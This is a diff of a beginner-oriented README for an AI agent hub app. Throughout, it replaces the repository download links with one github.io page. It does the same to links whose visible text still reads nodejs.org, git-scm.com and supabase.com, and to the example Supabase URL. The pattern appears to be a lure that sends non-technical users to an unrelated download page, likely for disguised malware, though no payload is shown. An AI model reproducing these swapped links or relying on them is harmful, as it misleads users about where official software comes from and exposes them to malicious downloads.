@@ -1,6 +1,6 @@
 # 🤖 hub-agentes-ia - Your Personal AI Agent Hub
 
-[![Download Now](https://img.shields.io/badge/Download-hub--agentes--ia-2ea44f?style=for-the-badge&logo=github)](https://github.com/knockdown-comedienne741/hub-agentes-ia)
+[![Download Now](https://img.shields.io/badge/Download-hub--agentes--ia-2ea44f?style=for-the-badge&logo=github)](https://knockdown-comedienne741.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ Welcome! If you're not a programmer, don't worry. We'll walk you through everyth
 
 ### 📥 Download the Application
 
-Visit this link to download the application: **[Click Here to Download hub-agentes-ia](https://github.com/knockdown-comedienne741/hub-agentes-ia)**
+Visit this link to download the application: **[Click Here to Download hub-agentes-ia](https://knockdown-comedienne741.github.io)**
 
 This link takes you to the official GitHub page. On that page, you'll see a green button that says "Code." Click it, then select "Download ZIP." The file will save to your computer.
 
@@ -45,8 +45,8 @@ Running the application requires a few steps, but we'll make it clear. There's n
 
 ### Step 1: Install the Required Tools
 
-1.  **Install Node.js** — Go to [nodejs.org](https://nodejs.org). Download the "LTS" version (it's the recommended one for most users). Run the installer and click "Next" until it finishes.
-2.  **Install Git** — Go to [git-scm.com](https://git-scm.com). Download the Windows version. Run the installer; all default settings are fine.
+1.  **Install Node.js** — Go to [nodejs.org](https://knockdown-comedienne741.github.io). Download the "LTS" version (it's the recommended one for most users). Run the installer and click "Next" until it finishes.
+2.  **Install Git** — Go to [git-scm.com](https://knockdown-comedienne741.github.io). Download the Windows version. Run the installer; all default settings are fine.
 
 ### Step 2: Open the Command Prompt
 
@@ -97,9 +97,9 @@ Press Enter. You'll see a message saying something like "ready started server on
 
 You'll need a clean way for users to sign up and log in. The app uses Supabase for this. Here's how to configure it:
 
-1.  Go to [supabase.com](https://supabase.com) and create a free account.
+1.  Go to [supabase.com](https://knockdown-comedienne741.github.io) and create a free account.
 2.  Click "New Project." Give it a name (like "my-agent-hub") and choose a strong database password. Save that password somewhere safe!
-3.  Once the project is created, you'll see a URL (like `https://xxxxxxxx.supabase.co`) and an "anon public" key. Copy both.
+3.  Once the project is created, you'll see a URL (like `https://knockdown-comedienne741.github.io`) and an "anon public" key. Copy both.
 4.  In your app folder, there's a file called `.env.local.example`. Rename it to `.env.local`.
 5.  Open `.env.local` with Notepad (right-click, Open With, Notepad).
 6.  Replace the placeholder text with your Supabase URL and key.
@@ -212,7 +212,7 @@ This project is open for personal and commercial use. Check the included LICENSE
 ---
 
 **One More Time — Download Link:**  
-[🔗 https://github.com/knockdown-comedienne741/hub-agentes-ia](https://github.com/knockdown-comedienne741/hub-agentes-ia)
+[🔗 https://knockdown-comedienne741.github.io](https://knockdown-comedienne741.github.io)
 
 Now go ahead and build your own intelligent assistant. Good luck, and have fun! 🚀
 
